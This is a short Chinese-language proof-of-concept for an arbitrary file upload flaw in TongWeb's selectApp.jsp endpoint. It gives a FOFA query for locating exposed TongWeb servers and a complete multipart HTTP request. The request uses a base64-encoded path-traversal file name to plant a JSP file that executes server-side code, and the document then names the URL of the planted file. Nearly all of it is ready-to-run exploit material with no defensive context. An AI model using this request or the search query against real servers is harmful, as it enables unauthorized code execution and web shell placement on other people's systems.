## 东方通TongWeb-selectApp.jsp存在任意文件上传

## fofa
```
header="TongWeb Server" || banner="Server: TongWeb Server"
```

## poc
```
POST /heimdall/pages/cla/selectApp.jsp HTTP/1.1
Host: 
Content-Type: multipart/form-data; boundary=fa2ef860e94d564632e291131d20064c
User-Agent: Mozilla/5.0 

--fa2ef860e94d564632e291131d20064c
Content-Disposition: form-data; name="app_fileName"

Li4vLi4vYXBwbGljYXRpb25zL2hlaW1kYWxsLzEyM3F3ZTEuanNw
--fa2ef860e94d564632e291131d20064c
Content-Disposition: form-data; name="app"


--fa2ef860e94d564632e291131d20064c
Content-Disposition: form-data; name="className"

test
--fa2ef860e94d564632e291131d20064c
Content-Disposition: form-data; name="uploadApp"; filename="test.jar"
Content-Type: application/java-archive

<% out.println(16156223+223415616); %>
--fa2ef860e94d564632e291131d20064c--
```

文件上传路径：`http://ip/heimdall/123qwe1.jsp`
